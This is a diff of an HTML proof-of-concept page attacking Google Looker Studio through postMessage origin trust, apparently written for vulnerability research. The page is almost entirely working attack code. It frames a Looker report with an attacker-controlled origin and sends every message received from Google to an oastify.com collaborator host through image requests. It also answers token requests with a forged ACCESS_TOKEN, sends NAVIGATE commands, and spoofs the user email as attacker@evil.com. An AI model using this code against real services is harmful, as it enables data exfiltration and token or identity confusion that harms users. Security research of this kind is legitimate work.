@@ -1,26 +1,25 @@
 <!DOCTYPE html>
 <html>
-<head><title>Looker Studio - Arbitrary Iframe Injection PoC</title></head>
+<head><title>Looker Studio - Token Injection PoC</title></head>
 <body style="margin:0;padding:20px;font-family:Arial;">
-<h2>Looker Studio - Arbitrary Iframe Injection via NAVIGATE postMessage</h2>
-<p>Looker Studio is loaded in an iframe with <code>liu=</code> attacker origin. A second smaller iframe (also Looker) is overlaid on top — the NAVIGATE handler replaces its content with the attacker's collaborator, visually proving injection inside the Looker context.</p>
+<h2>Looker Studio - Token Injection via PostMessage Origin Trust Override</h2>
+<p>Tests if injected ACCESS_TOKEN is used by Looker for real API calls.</p>
 <hr>
 
-<div id="container" style="position:relative;width:100%;height:500px;border:1px solid #333;">
-    <!-- Main Looker iframe - full size, stays untouched -->
-    <iframe id="lookerMain" style="width:100%;height:100%;border:none;"></iframe>
-
-    <!-- Injection iframe - small, overlaid on bottom-right to look "inside" Looker -->
-    <iframe id="lookerInject" style="position:absolute;bottom:15px;right:15px;width:350px;height:200px;border:2px solid #e94560;border-radius:6px;z-index:9999;background:#fff;"></iframe>
-</div>
+<iframe id="looker" width="100%" height="400" style="border:2px solid red;"></iframe>
 
 <h3>Log</h3>
-<pre id="log" style="background:#111;color:#0f0;padding:10px;max-height:300px;overflow-y:auto;font-size:12px;"></pre>
+<pre id="log" style="background:#111;color:#0f0;padding:10px;max-height:500px;overflow-y:auto;font-size:12px;"></pre>
 
 <script>
 var ATTACKER_ORIGIN = window.location.origin;
-var COLLABORATOR = 'https://7z7kqkxfeu6suua3sb1vsor2ltrkfd32.oastify.com';
+var COLLABORATOR = 'https://1hje8ef9woomcosxa5jpai9w3n9ex8lx.oastify.com';
 var REPORT_URL = 'https://lookerstudio.google.com/reporting/be06bd59-7ae1-4373-825c-075088ba0d51/page/p0/appview';
+
+// Attacker's fake token — if Looker uses this in API calls, we'll see it in network tab
+var FAKE_TOKEN = 'ATTACKER_INJECTED_TOKEN_' + Date.now();
+var tokenRequested = false;
+var tokenSent = false;
 
 function logMsg(msg) {
     var pre = document.getElementById('log');
@@ -36,55 +35,110 @@ function buildUrl() {
     return u.toString();
 }
 
+// Listen for ALL messages from Looker
 window.addEventListener('message', function(e) {
-    var data = typeof e.data === 'string' ? e.data : JSON.stringify(e.data);
-    logMsg('RECV [' + e.origin + ']: ' + data.substring(0, 500));
+    var raw = typeof e.data === 'string' ? e.data : JSON.stringify(e.data);
+    logMsg('RECV [' + e.origin + ']: ' + raw.substring(0, 600));
 
+    // Exfil everything to collaborator
     if (e.origin.indexOf('google.com') !== -1) {
-        new Image().src = COLLABORATOR + '/exfil?d=' + encodeURIComponent(data.substring(0, 300));
+        new Image().src = COLLABORATOR + '/exfil?d=' + encodeURIComponent(raw.substring(0, 300));
+
+        try {
+            var parsed = JSON.parse(e.data);
+
+            // === KEY TEST: Looker asks us for a token ===
+            if (parsed.type === 'REQUEST_ACCESS_TOKEN') {
+                tokenRequested = true;
+                logMsg('');
+                logMsg('========================================');
+                logMsg('CRITICAL: Looker asked us for ACCESS_TOKEN!');
+                logMsg('Responding with fake token: ' + FAKE_TOKEN);
+                logMsg('========================================');
+                logMsg('');
+                logMsg('INSTRUCTIONS: Open DevTools > Network tab in THIS browser.');
+                logMsg('Filter by "ATTACKER_INJECTED_TOKEN" to see if Looker uses it.');
+                logMsg('Also check for requests to googleapis.com with Authorization header.');
+                logMsg('');
+
+                // Respond with our fake token
+                var frame = document.getElementById('looker');
+                frame.contentWindow.postMessage(JSON.stringify({
+                    type: 'ACCESS_TOKEN',
+                    payload: {
+                        accessToken: FAKE_TOKEN,
+                        expiresAt: new Date(Date.now() + 3600000).toISOString()
+                    }
+                }), '*');
+
+                tokenSent = true;
+                logMsg('Fake ACCESS_TOKEN sent to Looker.');
+                logMsg('');
+                logMsg('NOW: Check Network tab for any request containing:');
+                logMsg('  Authorization: Bearer ' + FAKE_TOKEN);
+                logMsg('  Or any request with "ATTACKER_INJECTED_TOKEN" in headers/params');
+                logMsg('');
+
+                // Exfil the fact we responded
+                new Image().src = COLLABORATOR + '/token-injected?token=' + encodeURIComponent(FAKE_TOKEN);
+
+                // After injecting token, trigger actions that might cause API calls
+                setTimeout(function() {
+                    logMsg('Sending NAVIGATE to /reporting/create to trigger API calls with injected token...');
+                    frame.contentWindow.postMessage(JSON.stringify({
+                        type: 'NAVIGATE',
+                        payload: { url: '/reporting/create' }
+                    }), '*');
+                }, 2000);
+
+                setTimeout(function() {
+                    logMsg('Sending NAVIGATE to /datasources/create to trigger more API calls...');
+                    frame.contentWindow.postMessage(JSON.stringify({
+                        type: 'NAVIGATE',
+                        payload: { url: '/datasources/create' }
+                    }), '*');
+                }, 4000);
+
+                // Navigate back to report to trigger data fetch with injected token
+                setTimeout(function() {
+                    logMsg('Sending NAVIGATE back to report to trigger data fetch with injected token...');
+                    frame.contentWindow.postMessage(JSON.stringify({
+                        type: 'NAVIGATE',
+                        payload: { url: '/reporting/be06bd59-7ae1-4373-825c-075088ba0d51/page/p0' }
+                    }), '*');
+                }, 6000);
+            }
+
+            // Log any other interesting types
+            if (parsed.type === 'REQUEST_GOOGLE_AUTH_USER_EMAIL') {
+                logMsg('');
+                logMsg('Looker asked us for user email. Responding with attacker email...');
+                var frame = document.getElementById('looker');
+                frame.contentWindow.postMessage(JSON.stringify({
+                    type: 'GOOGLE_AUTH_USER_EMAIL',
+                    payload: { googleAuthUserEmail: 'attacker@evil.com' }
+                }), '*');
+                logMsg('Sent attacker email. If mismatch dialog appears, check if it uses our email in the login URL.');
+            }
+
+        } catch(ex) {}
     }
 });
 
+// Load Looker
 var targetUrl = buildUrl();
-
-// Load main Looker iframe (stays visible, untouched)
-logMsg('Loading main Looker iframe (stays visible)...');
-document.getElementById('lookerMain').src = targetUrl;
-
-// Load small overlay iframe (also Looker, will be NAVIGATEd)
-logMsg('Loading injection iframe (will be replaced via NAVIGATE)...');
-var injectFrame = document.getElementById('lookerInject');
-injectFrame.src = targetUrl;
-
-var injected = false;
-injectFrame.onload = function() {
-    if (injected) return;
-    injected = true;
-    logMsg('Injection iframe loaded. Waiting 5s for Angular bootstrap...');
-
-    setTimeout(function() {
-        logMsg('Sending NAVIGATE to replace injection iframe with Collaborator content...');
-
-        injectFrame.contentWindow.postMessage(JSON.stringify({
-            type: 'NAVIGATE',
-            payload: { url: COLLABORATOR + '/injected-inside-looker?proof=navigate-handler' }
-        }), '*');
-
-        logMsg('NAVIGATE sent. The small iframe should now show Collaborator content overlaid on Looker.');
-        logMsg('Collaborator will receive request with Referer: https://lookerstudio.google.com/');
-    }, 5000);
-};
-
-setTimeout(function() {
-    if (!injected) {
-        injected = true;
-        logMsg('Timeout fallback — sending NAVIGATE anyway...');
-        injectFrame.contentWindow.postMessage(JSON.stringify({
-            type: 'NAVIGATE',
-            payload: { url: COLLABORATOR + '/injected-inside-looker?proof=timeout-fallback' }
-        }), '*');
-    }
-}, 15000);
+logMsg('Loading Looker Studio with liu=' + ATTACKER_ORIGIN);
+logMsg('Fake token prepared: ' + FAKE_TOKEN);
+logMsg('');
+logMsg('WHAT TO WATCH:');
+logMsg('1. Wait for "REQUEST_ACCESS_TOKEN" in the log (Looker asks us for token)');
+logMsg('2. We auto-respond with fake token');
+logMsg('3. Open DevTools > Network tab');
+logMsg('4. Look for ANY request with "ATTACKER_INJECTED_TOKEN" or "Authorization: Bearer" header');
+logMsg('5. If googleapis.com requests use our token = HIGH SEVERITY (token confusion)');
+logMsg('6. If no requests use it = state pollution only (LOW severity)');
+logMsg('');
+document.getElementById('looker').src = targetUrl;
 </script>
 </body>
 </html>
